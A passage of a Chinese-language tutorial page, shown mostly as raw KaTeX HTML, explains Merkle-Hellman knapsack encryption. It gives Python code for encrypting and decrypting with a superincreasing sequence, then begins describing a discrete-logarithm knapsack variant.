style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span></span></span></span>，就是这么一个式子。这样我们就可以通过背包问相关的算法解密出v的二进制序列</li><li>由于这个序列是超递增序列，我们的解密就可以进行如下的遍历操作，这样可以很快速的求解出最终的结果</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>记</mtext><mi>x</mi><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><mtext>解密时已知</mtext><msub><mi>a</mi><mi>i</mi></msub><mtext>这个序列</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>&gt;</mo><msub><mi>a</mi><mi>n</mi></msub><mtext>说明</mtext><msub><mi>v</mi><mi>n</mi></msub><mtext>为</mtext><mn>1</mn><mo separator="true">,</mo><mi>x</mi><mo>&lt;</mo><msub><mi>a</mi><mi>n</mi></msub><mtext>说明</mtext><msub><mi>v</mi><mi>n</mi></msub><mtext>为</mtext><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>当</mtext><msub><mi>v</mi><mi>n</mi></msub><mtext>为</mtext><mn>1</mn><mtext>的时候</mtext><mo separator="true">,</mo><mtext>计算得</mtext><mi>x</mi><mo>=</mo><mi>x</mi><mo>−</mo><msub><mi>a</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>当</mtext><msub><mi>v</mi><mi>n</mi></msub><mtext>为</mtext><mn>0</mn><mtext>的时候</mtext><mo separator="true">,</mo><mtext>直接进行下一步操作</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>判断</mtext><mi>x</mi><mo>&gt;</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>说明</mtext><msub><mi>v</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>为</mtext><mn>1</mn><mo separator="true">,</mo><mi>x</mi><mo>&lt;</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>说明</mtext><msub><mi>v</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>为</mtext><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>以此类推直到</mtext><msub><mi>a</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}记x = \sum_{i=1}^{n}a_iv_i,解密时已知a_i这个序列\\x &gt;a_n说明v_n为1,x&lt;a_n说明v_n为0\\当v_n为1的时候,计算得x=x-a_n\\当v_n为0的时候,直接进行下一步操作\\判断x &gt;a_{n-1}说明v_{n-1}为1,x&lt;a_{n-1}说明v_{n-1}为0\\以此类推直到a_1\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.200000000000001em;vertical-align:-3.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.850000000000001em;"><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">记</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span></span></span><span style="top:-4.810000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">0</span></span></span><span style="top:-3.6100000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">当</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">当</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span></span></span><span style="top:-1.2100000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord">0</span></span></span><span style="top:-0.009999999999999953em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">推</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">到</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>解密出二进制序列后就可以还原出加密的消息了。但是当加密消息的二进制序列过长的时候我们在最后还原出二进制序列的时候需要的算力就很大，这个解密的时间一定程度上会受到影响。</li></ul></li></ul><h3 id="加解密代码实现"><a class="markdownIt-Anchor" href="#加解密代码实现"></a> 加解密代码实现</h3><ul><li>加密过程如下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># 选择加密的消息flag,将消息转为整数后再转为二进制序列</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">v = bytes_to_long(flag)</span><br><span class="line">v = <span class="built_in">bin</span>(v)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成模数m和与m互素的私钥</span></span><br><span class="line">m = getPrime(<span class="number">200</span>)</span><br><span class="line">w = getPrime(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个超递增序列a,并将列表b为ai*w的序列</span></span><br><span class="line">a = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">55</span>, <span class="number">127</span>, <span class="number">231</span>, <span class="number">512</span>, <span class="number">991</span>, <span class="number">2046</span>, <span class="number">4033</span>, <span class="number">8161</span>, <span class="number">16307</span>, <span class="number">32614</span>, <span class="number">65391</span>, <span class="number">130575</span>, <span class="number">261330</span>, <span class="number">522531</span>, <span class="number">1047888</span>, <span class="number">2094999</span>, <span class="number">4192536</span>, <span class="number">8382741</span>, <span class="number">16769048</span>, <span class="number">33545618</span>, <span class="number">67086288</span>, <span class="number">134167557</span>, <span class="number">268336325</span>, <span class="number">536672015</span>, <span class="number">1073358395</span>, <span class="number">2147301026</span>, <span class="number">4294750090</span>]</span><br><span class="line">b = []</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">total = 0</span></span><br><span class="line"><span class="string">for i in range(len(v)):</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        temp = random.randint(2**(i),2**(i+2))</span></span><br><span class="line"><span class="string">        if temp &gt; total:</span></span><br><span class="line"><span class="string">            total+=temp</span></span><br><span class="line"><span class="string">            a.append(temp)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">assert m &gt; sum(a)</span></span><br><span class="line"><span class="string">assert gmpy2.gcd(w,m)==1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 计算得到bi的过程</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">    b.append(a[i]*w)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对明文加密的过程</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">    c += <span class="built_in">int</span>(v[i],<span class="number">2</span>) * b[i]</span><br><span class="line">c = c % m</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 计算逆元</span></span><br><span class="line">w_ = gmpy2.invert(w,m)</span><br><span class="line">c = c*w_ % m</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否相等</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">    x += <span class="built_in">int</span>(v[i],<span class="number">2</span>)*a[i]</span><br><span class="line"><span class="keyword">assert</span> x == c</span><br></pre></td></tr></table></figure><h3 id="解密代码实现"><a class="markdownIt-Anchor" href="#解密代码实现"></a> 解密代码实现</h3><ul><li>由于是递增序列，所以我们可以从最高判断到最低，这样我们就可以，得到m的二进制位</li><li>此时我们就可以逐二进制位对其进行解密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">55</span>, <span class="number">127</span>, <span class="number">231</span>, <span class="number">512</span>, <span class="number">991</span>, <span class="number">2046</span>, <span class="number">4033</span>, <span class="number">8161</span>, <span class="number">16307</span>, <span class="number">32614</span>, <span class="number">65391</span>, <span class="number">130575</span>, <span class="number">261330</span>, <span class="number">522531</span>, <span class="number">1047888</span>, <span class="number">2094999</span>, <span class="number">4192536</span>, <span class="number">8382741</span>, <span class="number">16769048</span>, <span class="number">33545618</span>, <span class="number">67086288</span>, <span class="number">134167557</span>, <span class="number">268336325</span>, <span class="number">536672015</span>, <span class="number">1073358395</span>, <span class="number">2147301026</span>, <span class="number">4294750090</span>]</span><br><span class="line">c = <span class="number">7734243960</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> c&gt;=a[i]:</span><br><span class="line">        m += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        c-=a[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">m = <span class="built_in">int</span>(m[::-<span class="number">1</span>],<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="离散对数问题的背包加密"><a class="markdownIt-Anchor" href="#离散对数问题的背包加密"></a> 离散对数问题的背包加密</h2><ul><li>在他们的论文中除了提供了上面的<strong>Merkle-Hellman背包加密算法</strong>，还提供了另一种陷门方案，就是基于离散对数问题的乘法型陷门背包。</li><li>因为上面的那一种生成公钥的方式是线性生成的，所以该加密方式容易被攻击。</li><li>我们也详细介绍一下这个基于<strong>离散对数问题</strong>的背包加密过程。这个加密<strong>理论可行</strong>，但是在公私钥的生成会出现问题，这就使得背包加密体制一般都指前面一种背包加密。</li></ul><p><strong>私钥的生成</strong>：</p><ul><li><p>选取一个对数底数<strong>g</strong></p></li><li><p>选取一个模数<strong>p</strong></p></li><li><p>私钥的生成就是上文中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(需要满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中的元素两两互素)，并且此时的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>并不需要保证超递增序列，只需要保证<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>&gt;</mo><msubsup><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p&gt;\prod_{i=1}^na_iv_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span 